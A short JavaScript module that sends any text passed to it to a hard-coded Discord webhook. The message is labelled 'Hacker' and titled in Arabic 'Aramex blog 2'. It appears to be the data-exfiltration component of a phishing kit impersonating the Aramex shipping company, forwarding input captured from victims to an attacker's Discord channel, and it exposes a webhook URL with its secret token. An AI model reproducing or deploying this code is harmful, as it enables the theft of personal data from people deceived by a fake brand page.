import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: "  2 مدونة ارامكس ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1327612461234393179/5QC4YIrOu7-HIM3Dqdi2xw2X5e4_TZfLAgn-1-HHaCg5x5L8vMb2ct31bqfDjTZ53bv_",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
